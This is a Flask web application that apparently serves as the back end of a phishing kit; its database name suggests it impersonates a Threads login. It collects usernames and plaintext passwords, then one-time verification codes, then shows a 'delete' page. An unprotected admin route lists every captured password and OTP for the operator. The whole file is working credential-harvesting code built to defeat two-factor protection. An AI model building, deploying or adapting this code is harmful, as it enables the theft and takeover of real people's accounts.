from flask import Flask, render_template, request, redirect, url_for, flash
import sqlite3
import os

app = Flask(__name__)
app.secret_key = "replace-with-a-random-secret"  # change this for production

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
DB_NAME = os.path.join(BASE_DIR, "threads.db")

# simple flag so init_db runs only once per process (Flask 3.x)
_db_initialized = False


def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()

    c.execute(
        """
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
        """
    )

    c.execute(
        """
        CREATE TABLE IF NOT EXISTS otps (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            login_id INTEGER NOT NULL,
            otp TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (login_id) REFERENCES logins(id)
        )
        """
    )

    conn.commit()
    conn.close()


@app.before_request
def ensure_db():
    global _db_initialized
    if not _db_initialized:
        init_db()
        _db_initialized = True


@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()

    if not username or not password:
        flash("Please enter both username and password.")
        return redirect(url_for("index"))

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO logins (username, password) VALUES (?, ?)", (username, password))
    conn.commit()
    login_id = c.lastrowid
    conn.close()

    # redirect to verify page for this login record
    return redirect(url_for("verify", login_id=login_id))


@app.route("/verify/<int:login_id>", methods=["GET", "POST"])
def verify(login_id):
    # fetch login info (for display)
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT id, username, created_at FROM logins WHERE id = ?", (login_id,))
    login_row = c.fetchone()
    conn.close()

    if login_row is None:
        flash("Invalid verification link.")
        return redirect(url_for("index"))

    if request.method == "GET":
        return render_template("verify.html", login=login_row)

    # POST -> store OTP then redirect to /delete
    otp_value = request.form.get("otp", "").strip()
    if not otp_value:
        flash("Please enter the OTP.")
        return redirect(url_for("verify", login_id=login_id))

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO otps (login_id, otp) VALUES (?, ?)", (login_id, otp_value))
    conn.commit()
    conn.close()

    return redirect(url_for("delete_page"))


@app.route("/delete")
def delete_page():
    return render_template("delete.html")


@app.route("/admin")
def admin():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()

    c.execute("SELECT id, username, password, created_at FROM logins ORDER BY id DESC")
    logins = c.fetchall()

    c.execute(
        """
        SELECT otps.id, otps.login_id, otps.otp, otps.created_at, logins.username
        FROM otps
        LEFT JOIN logins ON otps.login_id = logins.id
        ORDER BY otps.id DESC
        """
    )
    otps = c.fetchall()

    conn.close()
    return render_template("admin.html", logins=logins, otps=otps)


if __name__ == "__main__":
    # host only matters for local testing; on PA/Render the platform handles it
    app.run(host="0.0.0.0", port=5000, debug=True)
